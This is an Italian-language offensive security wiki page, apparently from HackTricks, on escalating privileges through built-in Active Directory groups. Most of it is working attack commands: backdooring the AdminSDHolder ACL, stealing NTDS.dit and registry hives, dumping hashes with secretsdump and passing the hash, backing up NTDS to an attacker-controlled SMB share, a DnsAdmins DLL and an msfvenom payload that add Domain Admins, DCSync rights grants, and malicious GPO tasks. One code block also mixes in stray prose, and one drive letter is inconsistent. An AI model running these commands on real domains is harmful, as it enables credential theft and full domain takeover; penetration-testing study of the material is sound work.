# Gruppi privilegiati

{{#include ../../banners/hacktricks-training.md}}

## Gruppi ben noti con privilegi amministrativi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Questo gruppo è autorizzato a creare account e gruppi che non sono amministratori nel dominio. Inoltre, consente l'accesso locale al Domain Controller (DC).

Per identificare i membri di questo gruppo, viene eseguito il seguente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
È consentito aggiungere nuovi utenti, così come eseguire il login locale al DC.

## Gruppo AdminSDHolder

La Access Control List (ACL) del gruppo **AdminSDHolder** è cruciale poiché imposta i permessi per tutti i "protected groups" all'interno di Active Directory, inclusi i gruppi ad alto privilegio. Questo meccanismo garantisce la sicurezza di questi gruppi impedendo modifiche non autorizzate.

Un attaccante potrebbe sfruttare ciò modificando la ACL del gruppo **AdminSDHolder**, concedendo permessi completi a un utente standard. Questo darebbe effettivamente a quell'utente il controllo completo su tutti i protected groups. Se i permessi di questo utente vengono modificati o rimossi, verranno automaticamente ripristinati entro un'ora a causa del design del sistema.

La documentazione recente di Windows Server considera ancora diversi gruppi operatori integrati come oggetti **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Il processo **SDProp** gira sul **PDC Emulator** ogni 60 minuti per default, imposta `adminCount=1` e disabilita l'ereditarietà sugli oggetti protetti. Questo è utile sia per la persistenza sia per individuare utenti privilegiati obsoleti che sono stati rimossi da un protected group ma mantengono ancora la ACL non ereditaria.

I comandi per controllare i membri e modificare i permessi includono:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
È disponibile uno script per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Per maggiori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

L'appartenenza a questo gruppo permette la lettura degli oggetti cancellati di Active Directory, che possono rivelare informazioni sensibili:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Questo è utile per **recuperare percorsi di privilegi precedenti**. Gli oggetti eliminati possono ancora esporre `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, vecchi SPNs, o il DN di un gruppo privilegiato eliminato che può successivamente essere ripristinato da un altro operatore.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Accesso al Domain Controller

L'accesso ai file sul DC è limitato a meno che l'utente non faccia parte del gruppo `Server Operators`, che modifica il livello di accesso.

### Escalation dei privilegi

Usando `PsService` o `sc` di Sysinternals, è possibile ispezionare e modificare i permessi dei servizi. Il gruppo `Server Operators`, per esempio, ha il controllo completo su alcuni servizi, permettendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Questo comando rivela che `Server Operators` hanno pieno accesso, consentendo la manipolazione dei servizi per ottenere privilegi elevati.

## Backup Operators

L'appartenenza al gruppo `Backup Operators` fornisce accesso al file system di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi consentono l'attraversamento delle cartelle, la loro enumerazione e la copia di file, anche senza permessi espliciti, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. È necessario utilizzare script specifici per questo processo.

Per elencare i membri del gruppo, esegui:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attacco locale

Per sfruttare questi privilegi localmente, vengono eseguiti i seguenti passaggi:

1. Importare le librerie necessarie:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Abilitare e verificare `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accedere e copiare file da directory ristrette, ad esempio:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attacco AD

L'accesso diretto al file system del Domain Controller consente il furto del database `NTDS.dit`, che contiene tutti gli hash NTLM degli utenti e dei computer del dominio.

#### Uso di diskshadow.exe

1. Crea una shadow copy del disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copia `NTDS.dit` dalla shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
In alternativa, usa `robocopy` per la copia dei file:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Estrai `SYSTEM` e `SAM` per il recupero degli hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupera tutti gli hash da `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-estrazione: Pass-the-Hash a DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Uso di wbadmin.exe

1. Configura un filesystem NTFS per il server SMB sulla macchina dell'attaccante e memorizza le credenziali SMB sulla macchina target.
2. Usa `wbadmin.exe` per il backup di sistema e l'estrazione di `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Per una dimostrazione pratica, vedi [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa possibilità offre un significativo potenziale di sfruttamento.

Per elencare i membri del gruppo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Eseguire una DLL arbitraria (CVE‑2021‑40469)

> [!NOTE]
> Questa vulnerabilità permette l'esecuzione di codice arbitrario con privilegi SYSTEM nel servizio DNS (di solito all'interno dei DC). Il problema è stato risolto nel 2021.

I membri possono far caricare al server DNS una DLL arbitraria (localmente o da una condivisione remota) utilizzando comandi come:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Il riavvio del servizio DNS (che può richiedere permessi aggiuntivi) è necessario affinché la DLL venga caricata:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Per maggiori dettagli su questo vettore d'attacco, consultare ired.team.

#### Mimilib.dll

È inoltre possibile utilizzare mimilib.dll per l'esecuzione di comandi, modificandola per eseguire comandi specifici o reverse shells. [Vedi questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per maggiori informazioni.

### WPAD Record per MitM

DnsAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM) creando un record WPAD dopo aver disabilitato la lista globale di blocco delle query. Strumenti come Responder o Inveigh possono essere usati per lo spoofing e la cattura del traffico di rete.

### Event Log Readers
I membri possono accedere ai log degli eventi, potenzialmente trovando informazioni sensibili come password in chiaro o dettagli sull'esecuzione dei comandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Questo gruppo può modificare le DACLs sull'oggetto di dominio, potenzialmente concedendo DCSync privileges. Le tecniche per privilege escalation che sfruttano questo gruppo sono dettagliate in Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Se puoi agire come membro di questo gruppo, l'abuso classico è concedere a un attacker-controlled principal i diritti di replica necessari per [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Storicamente, **PrivExchange** concatenava l'accesso alle caselle di posta, la coercizione dell'autenticazione di Exchange e il LDAP relay per arrivare alla stessa primitiva. Anche quando quel percorso di relay è mitigato, l'appartenenza diretta a `Exchange Windows Permissions` o il controllo di un server Exchange resta una via di alto valore per ottenere i diritti di replica del dominio.

## Hyper-V Administrators

Hyper-V Administrators hanno pieno accesso a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controller virtualizzati. Ciò include clonare DC attivi ed estrarre hash NTLM dal file NTDS.dit.

### Exploitation Example

L'abuso pratico è di solito **accesso offline ai dischi/checkpoint dei DC** piuttosto che i vecchi trucchi di LPE a livello host. Con l'accesso all'host Hyper-V, un operatore può creare un checkpoint o esportare un Domain Controller virtualizzato, montare il VHDX ed estrarre `NTDS.dit`, `SYSTEM` e altri segreti senza toccare LSASS all'interno dell'guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Da lì, riutilizza il flusso di lavoro di `Backup Operators` per copiare `Windows\NTDS\ntds.dit` e le hive del registro in modalità offline.

## Group Policy Creators Owners

Questo gruppo consente ai membri di creare Group Policies nel dominio. Tuttavia, i membri non possono applicare i Group Policies a utenti o gruppi né modificare GPOs esistenti.

La sfumatura importante è che il **creatore diventa proprietario del nuovo GPO** e di solito ottiene abbastanza diritti per modificarlo in seguito. Ciò significa che questo gruppo è interessante quando puoi:

- creare un GPO malizioso e convincere un admin a collegarlo all'OU/domain di destinazione
- modificare un GPO che hai creato e che è già collegato in una posizione utile
- abusare di un altro diritto delegato che ti permette di collegare GPOs, mentre questo gruppo ti fornisce i diritti per modificarli

L'abuso pratico normalmente implica l'aggiunta di un **Immediate Task**, **startup script**, **local admin membership** o una modifica a **user rights assignment** tramite file di policy basati su SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Se si modifica manualmente la GPO tramite `SYSVOL`, ricorda che la modifica da sola non è sufficiente: `versionNumber`, `GPT.ini` e talvolta `gPCMachineExtensionNames` devono essere aggiornati anch'essi, altrimenti i client ignoreranno l'aggiornamento della policy.

## Organization Management

In ambienti in cui è distribuito **Microsoft Exchange**, un gruppo speciale noto come **Organization Management** detiene capacità significative. Questo gruppo ha il privilegio di **accedere alle caselle di posta di tutti gli utenti del dominio** e mantiene il **controllo completo sull'Unità Organizzativa (OU) 'Microsoft Exchange Security Groups'**. Questo controllo include il gruppo **`Exchange Windows Permissions`**, che può essere sfruttato per l'escalation dei privilegi.

### Sfruttamento dei privilegi e comandi

#### Print Operators

I membri del gruppo **Print Operators** possiedono diversi privilegi, incluso il **`SeLoadDriverPrivilege`**, che consente loro di **accedere localmente a un Domain Controller**, spegnerlo e gestire le stampanti. Per sfruttare questi privilegi, specialmente se **`SeLoadDriverPrivilege`** non è visibile in un contesto senza elevazione, è necessario bypassare User Account Control (UAC).

Per elencare i membri di questo gruppo, viene usato il seguente comando PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Sui Domain Controller questo gruppo è pericoloso perché la Domain Controller Policy predefinita assegna **`SeLoadDriverPrivilege`** a `Print Operators`. Se ottieni un token elevato per un membro di questo gruppo, puoi abilitare il privilegio e caricare un driver firmato ma vulnerabile per passare al kernel/SYSTEM. Per dettagli sulla gestione dei token, consulta [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Utenti Remote Desktop

I membri di questo gruppo hanno accesso ai PC tramite Remote Desktop Protocol (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Ulteriori approfondimenti sullo sfruttamento di RDP possono essere trovati in risorse dedicate al pentesting.

#### Utenti di gestione remota

I membri possono accedere ai PC tramite **Windows Remote Management (WinRM)**. L'enumerazione di questi membri si ottiene tramite:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Per le tecniche di exploitation relative a **WinRM**, consultare la documentazione specifica.

#### Server Operators

Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controllers, inclusi i privilegi di backup e ripristino, la modifica dell'ora di sistema e lo spegnimento del sistema. Per enumerare i membri, il comando fornito è:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Sui Domain Controllers, `Server Operators` ereditano comunemente diritti sufficienti per **riconfigurare o avviare/fermare servizi** e ricevono anche `SeBackupPrivilege`/`SeRestorePrivilege` tramite la politica DC predefinita. In pratica, questo li rende un ponte tra **service-control abuse** e **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Se l'ACL del servizio concede a questo gruppo i diritti change/start, punta il servizio su un comando arbitrario, avvialo come `LocalSystem`, e poi ripristina il `binPath` originale. Se il controllo dei servizi è bloccato, ricorri alle tecniche di `Backup Operators` sopra per copiare `NTDS.dit`.

## Riferimenti <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
